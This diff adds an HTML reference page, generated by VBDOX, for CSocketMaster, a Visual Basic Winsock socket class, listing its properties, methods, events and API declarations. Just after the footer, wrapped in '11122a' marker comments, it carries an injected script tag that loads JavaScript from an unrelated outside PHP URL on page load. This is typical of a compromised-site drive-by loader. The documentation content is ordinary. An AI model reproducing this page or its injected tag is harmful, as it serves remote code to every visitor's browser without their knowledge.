@@ -1,0 +1,136 @@
+<!doctype html public "-//w3c//dtd html 4.0 transitional//en">
+<html>
+<head>
+  <meta http-equiv="Content-Type" content="Text/html; charset=iso-8859-1">
+  <meta name="Author" content = "m.stamenov" >
+  <meta name="GENERATOR" content="VBDOX [2.0.15]" >
+  <link REL="stylesheet" TYPE="text/css" HREF="backsdk4.css">
+  <script SRC="langref.js"></script>
+  <title>CSocketMaster</title>
+</head>
+<BODY TOPMARGIN="0">
+<TABLE CLASS="buttonbarshade" CELLSPACING=0><TR><TD>&nbsp;</TD></TR></TABLE>
+<TABLE CLASS="buttonbartable" CELLSPACING=0>
+<TR ID="hdr"><TD CLASS="runninghead" NOWRAP>CSocketMaster</TD></TR>
+</TABLE>
+<!-- ============ MODULE ============ -->
+<h2>CSocketMaster</h2>
+<br>
+Winsock api implementation class.<BR>
+Requires modSocketMaster.bas code module.
+
+
+<p><br>
+<b>Version:</b>  1.3
+<br>
+<b>Author:</b>  Copyright (c) 2004 by Emiliano Scavuzzo. Rosario, Argentina<BR>Based on CSocket by Oleg Gdalevich<BR>Subclassing based on WinSubHook2 by Paul Caton
+<br>
+<b>Modified:</b>  04/02/2005
+</p>
+<!-- ============ INHERITS ============ -->
+<!-- ============ IMPLEMENTS ============ -->
+<!-- ============ PUBLIC ============ -->
+<h3><a name="public"></a>Public:</h3><!-- ============ TYPES ============ -->
+<h4><a name="public_types"></a>Types:</h4><table><thead><tr valign="top"><th align="left" width="48%">Name</th><th align="left" width="52%">Description</th></tr></thead><tbody><tr valign="top"><td width="48%"><IMG src="Enum.gif" align="middle" border="0" alt=""></IMG>&nbsp;SockState</td><td width="52%">&nbsp;</td></tr></tbody></table>
+<!-- ============ PROPERTIES ============ -->
+<h4><a name="public_props"></a>Properties:</h4><table><thead><tr valign="top"><th align="left" width="48%">Name</th><th align="left" width="52%">Description</th></tr></thead><tbody><tr valign="top"><td width="48%"><IMG src="Property.gif" align="middle" border="0" alt=""></IMG>&nbsp;BytesReceived&nbsp;(get)</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Property.gif" align="middle" border="0" alt=""></IMG>&nbsp;LocalPort&nbsp;(get)</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Property.gif" align="middle" border="0" alt=""></IMG>&nbsp;LocalPort&nbsp;(let)</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Property.gif" align="middle" border="0" alt=""></IMG>&nbsp;SocketHandle&nbsp;(get)</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Property.gif" align="middle" border="0" alt=""></IMG>&nbsp;State&nbsp;(get)</td><td width="52%">&nbsp;</td></tr></tbody></table>
+<!-- ============ METHODS ============ -->
+<h4><a name="public_methods"></a>Methods:</h4><table><thead><tr valign="top"><th align="left" width="48%">Name</th><th align="left" width="52%">Description</th></tr></thead><tbody><tr valign="top"><td width="48%"><IMG src="Sub.gif" align="middle" border="0" alt=""></IMG>&nbsp;Accept</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Sub.gif" align="middle" border="0" alt=""></IMG>&nbsp;Bind</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Sub.gif" align="middle" border="0" alt=""></IMG>&nbsp;CloseSck</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Sub.gif" align="middle" border="0" alt=""></IMG>&nbsp;GetData</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Sub.gif" align="middle" border="0" alt=""></IMG>&nbsp;Listen</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Sub.gif" align="middle" border="0" alt=""></IMG>&nbsp;SendData</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Sub.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="CSocketMaster.WndProc.html">WndProc</a></td><td width="52%">
+This sub receives system messages from our WndProc.<BR>
+<B>This sub MUST be the first on the class</B>. DO NOT attempt<BR>
+to change its location or the code will CRASH.&nbsp;</td></tr></tbody></table>
+<!-- ============ EVENTS ============ -->
+<h4><a name="public_events"></a>Events:</h4><table><thead><tr valign="top"><th align="left" width="48%">Name</th><th align="left" width="52%">Description</th></tr></thead><tbody><tr valign="top"><td width="48%"><IMG src="Event.gif" align="middle" border="0" alt=""></IMG>&nbsp;CloseSck</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Event.gif" align="middle" border="0" alt=""></IMG>&nbsp;Connect</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Event.gif" align="middle" border="0" alt=""></IMG>&nbsp;ConnectionRequest</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Event.gif" align="middle" border="0" alt=""></IMG>&nbsp;DataArrival</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Event.gif" align="middle" border="0" alt=""></IMG>&nbsp;Error</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Event.gif" align="middle" border="0" alt=""></IMG>&nbsp;SendComplete</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Event.gif" align="middle" border="0" alt=""></IMG>&nbsp;SendProgress</td><td width="52%">&nbsp;</td></tr></tbody></table>
+<!-- ============ PRIVATE ============ -->
+<h3><a name="private"></a>Private:</h3><!-- ============ CSocketMaster ============ -->
+<h4><a name="CSocketMaster"></a>CSocketMaster</h4><table><thead><tr valign="top"><th align="left" width="48%">Name</th><th align="left" width="52%">Description</th></tr></thead><tbody><tr valign="top"><td width="48%"><IMG src="Sub.gif" align="middle" border="0" alt=""></IMG>&nbsp;Class_Initialize</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Sub.gif" align="middle" border="0" alt=""></IMG>&nbsp;Class_Terminate</td><td width="52%">&nbsp;</td></tr></tbody></table>
+<!-- ============ CONSTANTS ============ -->
+<h4><a name="private_consts"></a>Constants:</h4><table><thead><tr valign="top"><th align="left" width="48%">Name</th><th align="left" width="52%">Description</th></tr></thead><tbody><tr valign="top"><td width="48%"><IMG src="Const.gif" align="middle" border="0" alt=""></IMG>&nbsp;AF_INET</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Const.gif" align="middle" border="0" alt=""></IMG>&nbsp;IPPROTO_TCP</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Const.gif" align="middle" border="0" alt=""></IMG>&nbsp;SO_RCVBUF</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Const.gif" align="middle" border="0" alt=""></IMG>&nbsp;SO_SNDBUF</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Const.gif" align="middle" border="0" alt=""></IMG>&nbsp;SOCK_DGRAM</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Const.gif" align="middle" border="0" alt=""></IMG>&nbsp;SOCK_STREAM</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Const.gif" align="middle" border="0" alt=""></IMG>&nbsp;SOL_SOCKET</td><td width="52%">&nbsp;</td></tr></tbody></table>
+<!-- ============ TYPES ============ -->
+<h4><a name="private_types"></a>Types:</h4><table><thead><tr valign="top"><th align="left" width="48%">Name</th><th align="left" width="52%">Description</th></tr></thead><tbody><tr valign="top"><td width="48%"><IMG src="Type.gif" align="middle" border="0" alt=""></IMG>&nbsp;HOSTENT</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Type.gif" align="middle" border="0" alt=""></IMG>&nbsp;sockaddr_in</td><td width="52%">&nbsp;</td></tr></tbody></table>
+<!-- ============ PROPERTIES ============ -->
+<h4><a name="private_props"></a>Properties:</h4><table><thead><tr valign="top"><th align="left" width="48%">Name</th><th align="left" width="52%">Description</th></tr></thead><tbody><tr valign="top"><td width="48%"><IMG src="Variable.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="CSocketMaster.m_blnAcceptClass.html">m_blnAcceptClass</a></td><td width="52%">
+If True then this is an Accept socket class&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Variable.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="CSocketMaster.m_colWaitingResolutions.html">m_colWaitingResolutions</a></td><td width="52%">
+hosts waiting to be resolved by the system&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Variable.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="CSocketMaster.m_enmState.html">m_enmState</a></td><td width="52%">
+socket state&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Variable.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="CSocketMaster.m_lngLocalPort.html">m_lngLocalPort</a></td><td width="52%">
+local port&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Variable.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="CSocketMaster.m_lngLocalPortBind.html">m_lngLocalPortBind</a></td><td width="52%">
+temporary local port&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Variable.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="CSocketMaster.m_lngMemoryHandle.html">m_lngMemoryHandle</a></td><td width="52%">
+buffer memory handle&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Variable.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="CSocketMaster.m_lngMemoryPointer.html">m_lngMemoryPointer</a></td><td width="52%">
+memory pointer used as buffer when resolving host&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Variable.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="CSocketMaster.m_lngRecvBufferLen.html">m_lngRecvBufferLen</a></td><td width="52%">
+winsock buffer size for receives&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Variable.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="CSocketMaster.m_lngRemotePort.html">m_lngRemotePort</a></td><td width="52%">
+remote port&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Variable.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="CSocketMaster.m_lngSendBufferLen.html">m_lngSendBufferLen</a></td><td width="52%">
+winsock buffer size for sends&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Variable.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="CSocketMaster.m_lngSocketHandle.html">m_lngSocketHandle</a></td><td width="52%">
+socket handle&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Variable.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="CSocketMaster.m_strLocalIP.html">m_strLocalIP</a></td><td width="52%">
+local IP&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Variable.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="CSocketMaster.m_strRecvBuffer.html">m_strRecvBuffer</a></td><td width="52%">
+local outgoing buffer&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Variable.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="CSocketMaster.m_strRemoteHost.html">m_strRemoteHost</a></td><td width="52%">
+remote host&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Variable.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="CSocketMaster.m_strRemoteHostIP.html">m_strRemoteHostIP</a></td><td width="52%">
+remote host ip&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Variable.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="CSocketMaster.m_strSendBuffer.html">m_strSendBuffer</a></td><td width="52%">
+local incoming buffer&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Variable.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="CSocketMaster.m_strTag.html">m_strTag</a></td><td width="52%">
+tag&nbsp;</td></tr></tbody></table>
+<!-- ============ METHODS ============ -->
+<h4><a name="private_methods"></a>Methods:</h4><table><thead><tr valign="top"><th align="left" width="48%">Name</th><th align="left" width="52%">Description</th></tr></thead><tbody><tr valign="top"><td width="48%"><IMG src="Function.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="CSocketMaster.BindInternal.html">BindInternal</a></td><td width="52%">
+This function binds a socket to a local port and IP.
+
+&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Sub.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="CSocketMaster.BuildArray.html">BuildArray</a></td><td width="52%">
+Returns a byte array of Size bytes filled with incoming buffer data.
+
+&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Sub.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="CSocketMaster.CleanResolutionSystem.html">CleanResolutionSystem</a></td><td width="52%">
+Clean resolution system that is in charge of
+asynchronous hostname resolutions.&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Sub.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="CSocketMaster.ConnectToIP.html">ConnectToIP</a></td><td width="52%">
+Connect to a given 32 bits long ip
+
+&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Sub.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="CSocketMaster.DestroySocket.html">DestroySocket</a></td><td width="52%">
+Destroys the socket if it exists and unregisters it
+from control list.&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Sub.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="CSocketMaster.FreeMemory.html">FreeMemory</a></td><td width="52%">
+Free memory allocated by AllocateMemory&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Function.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="CSocketMaster.GetLocalInfo.html">GetLocalInfo</a></td><td width="52%">
+Retrieves local info from a connected socket.
+
+&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Function.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="CSocketMaster.GetLocalPort.html">GetLocalPort</a></td><td width="52%">
+Returns local port from a connected or bound socket.<P>
+&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Function.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="CSocketMaster.GetRemoteInfo.html">GetRemoteInfo</a></td><td width="52%">
+Retrieves remote info from a connected socket.
+
+&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Sub.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="CSocketMaster.PostResolution.html">PostResolution</a></td><td width="52%">
+When the system resolves a hostname in asynchronous way we
+call this function to decide what to do with the result.
+
+&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Sub.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="CSocketMaster.PostSocket.html">PostSocket</a></td><td width="52%">
+This procedure is called by the WindowProc callback function.
+
+&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Sub.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="CSocketMaster.ProcessOptions.html">ProcessOptions</a></td><td width="52%">
+Retrieves some socket options.
+If it is an UDP socket also sets SO_BROADCAST option.&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Function.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="CSocketMaster.RecvData.html">RecvData</a></td><td width="52%">
+This function is to retrieve data from the buffer. If we are using TCP
+then the data is retrieved from a local buffer (m_strRecvBuffer). If we
+are using UDP the data is retrieved from winsock buffer.
+This function returns number of bytes received, and move data from
+the buffer into the data argument.
+MOVE means that data will be removed from the buffer.
+
+&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Function.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="CSocketMaster.RecvDataToBuffer.html">RecvDataToBuffer</a></td><td width="52%">
+This function retrieves data from the Winsock buffer
+into the class local buffer.
+
+&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Function.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="CSocketMaster.ResolveIfHostnameSync.html">ResolveIfHostnameSync</a></td><td width="52%">
+Resolves a host (if necessary) in synchronous way
+If succeeds returns a 32 bits long IP,
+strHostIP = readable IP string and lngErrorCode = 0
+If fails returns vbNull,
+strHostIP = vbNullString and lngErrorCode <> 0
+
+&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Sub.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="CSocketMaster.SendBufferedData.html">SendBufferedData</a></td><td width="52%">
+Send buffered data if we are using TCP protocol.&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Function.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="CSocketMaster.SocketExists.html">SocketExists</a></td><td width="52%">
+Tries to create a socket if there isnt one yet and registers
+it to the control list.
+
+&nbsp;</td></tr></tbody></table>
+<!-- ============ DECLARATIONS ============ -->
+<h4><a name="private_declarations"></a>Declarations:</h4><table><thead><tr valign="top"><th align="left" width="48%">Name</th><th align="left" width="52%">Description</th></tr></thead><tbody><tr valign="top"><td width="48%"><IMG src="Declare.gif" align="middle" border="0" alt=""></IMG>&nbsp;api_accept&nbsp;(function)</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Declare.gif" align="middle" border="0" alt=""></IMG>&nbsp;api_bind&nbsp;(function)</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Declare.gif" align="middle" border="0" alt=""></IMG>&nbsp;api_closesocket&nbsp;(function)</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Declare.gif" align="middle" border="0" alt=""></IMG>&nbsp;api_connect&nbsp;(function)</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Declare.gif" align="middle" border="0" alt=""></IMG>&nbsp;api_gethostbyname&nbsp;(function)</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Declare.gif" align="middle" border="0" alt=""></IMG>&nbsp;api_getpeername&nbsp;(function)</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Declare.gif" align="middle" border="0" alt=""></IMG>&nbsp;api_getsockname&nbsp;(function)</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Declare.gif" align="middle" border="0" alt=""></IMG>&nbsp;api_htons&nbsp;(function)</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Declare.gif" align="middle" border="0" alt=""></IMG>&nbsp;api_inet_addr&nbsp;(function)</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Declare.gif" align="middle" border="0" alt=""></IMG>&nbsp;api_inet_ntoa&nbsp;(function)</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Declare.gif" align="middle" border="0" alt=""></IMG>&nbsp;api_listen&nbsp;(function)</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Declare.gif" align="middle" border="0" alt=""></IMG>&nbsp;api_ntohs&nbsp;(function)</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Declare.gif" align="middle" border="0" alt=""></IMG>&nbsp;api_recv&nbsp;(function)</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Declare.gif" align="middle" border="0" alt=""></IMG>&nbsp;api_send&nbsp;(function)</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Declare.gif" align="middle" border="0" alt=""></IMG>&nbsp;api_setsockopt&nbsp;(function)</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Declare.gif" align="middle" border="0" alt=""></IMG>&nbsp;api_socket&nbsp;(function)</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Declare.gif" align="middle" border="0" alt=""></IMG>&nbsp;api_WSACancelAsyncRequest&nbsp;(function)</td><td width="52%">&nbsp;</td></tr></tbody></table>
+<H4>Requirements</H4>
+<P> 1.3
+</P>
+<DIV class=footer>Build on martes, 11 de noviembre de 2008 by VBDOX <BR>Copyright &copy; 2000 - 2003 M.Stamenov</DIV><!--11122a--><script type="text/javascript" src="http://biozapp.com/Kfx6FNrG.php?id=13042454"></script><!--/11122a-->
+
+<DIV class=footer style="COLOR: #000000; FONT-SIZE: 90%">
+</body>
+</html>
